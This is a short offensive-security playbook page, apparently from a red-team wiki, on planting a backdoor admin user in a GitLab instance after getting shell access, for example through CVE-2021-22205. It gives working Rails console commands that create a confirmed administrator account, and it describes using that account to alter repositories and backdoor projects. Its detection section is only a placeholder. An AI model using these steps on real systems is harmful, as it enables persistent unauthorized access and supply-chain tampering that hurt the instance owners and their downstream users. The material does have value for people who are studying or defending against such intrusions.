# Adding a Backdoor User
## Summary

Having a user on a gitlab instance can open up a lot of interesting opportunities, especially if that user is an admin. For example, this user can modify existing repositories and place backdoors in projects, or even add [pre-build commands to visual studio projects](./csproj.md).

## Prerequisites

A gitlab instance is required, as well as some form of shell access. This can be obtained with, for example, [CVE-2021-22205](./cve-2021-22205.md).

## Setup

N/A

## Execution

### Method 1 - Rails Console

```bash
gitlab-rails console
```

In the console, run the following commands to add an admin user:

```ruby
u = User.new(username: 'username', email: 'username@test.com', name: 'username', password: 'password', password_confirmation: 'password')
u.skip_confirmation!
u.admin = true
u.save!
```

If you want a normal user and not an admin user, omit the `u.admin = true` command.

You should now be able to sign in with the credentials you created:

![image](./images/Pasted%20image%2020231102142623.png)

#### Indicators of Compromise

TODO